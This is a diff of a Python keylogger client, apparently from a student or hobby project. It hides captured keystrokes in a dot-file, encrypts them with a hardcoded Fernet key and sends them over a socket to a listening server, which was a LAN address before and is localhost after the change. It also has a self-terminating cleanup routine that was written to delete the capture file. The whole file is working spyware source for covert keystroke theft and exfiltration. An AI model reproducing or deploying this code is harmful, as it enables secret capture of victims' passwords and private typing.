@@ -5,7 +5,9 @@ import os
 from datetime import datetime
 from cryptography.fernet import Fernet
 import signal
-import psutil
+import json
+
+from shared import stop_event
 
 def get_filename():
     now = datetime.now()
@@ -23,14 +25,18 @@ def launch_keylogger(mysocket):
     return keylogger.listen_keyboard(mysocket)
 
 def kill_server():
+    print("> Kill: kill_server \n")
     if os.name == "nt":
+        stop_event.set()
         os._exit(1)
     else:
-        p = psutil.Process(os.getpid())
-        p.terminate()
+        os.kill(os.getpid(), signal.SIGINT)
+
 def stop_and_delete_capture_file():
     file = ".document1.txt" 
-    os.remove(file)
+
+    print("> Remove File: stop_and_delete_capture_file \n")
+    # os.remove(file)
     kill_server()
 
     
@@ -41,36 +47,35 @@ def get_socket(server_address, server_port):
     return client_socket
 
 def send_file_securely(client_socket):
+    if stop_event.is_set():
+        return
+
     try:
         key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
  
         filename = get_filename()
-        encrypted_message = Fernet(key).encrypt(filename.encode())
-        client_socket.send(encrypted_message)
 
         with open(".document1.txt", "r") as file:
             lines = file.read()
-            encrypted_lines = Fernet(key).encrypt(lines.encode('utf-8'))
+            data = [filename, lines]
+            json_data = json.dumps(data)
+
+            encrypted_lines = Fernet(key).encrypt(json_data.encode())
+                        
             client_socket.send(encrypted_lines)
+
             file.close()
             del file
-    except Exception:
-        pass
             
     finally:
         client_socket.close()
 
 if __name__ == "__main__":
-    try:
-        mysocket = get_socket("192.168.1.13", 12345)
-        launch_keylogger(mysocket)
-    except Exception:
-        pass
+    mysocket = get_socket("127.0.0.1", 12345)
+    launch_keylogger(mysocket)
 
-    """
     try:
         send_file_securely(mysocket)
     except KeyboardInterrupt:
         kill_server()
-    """
 
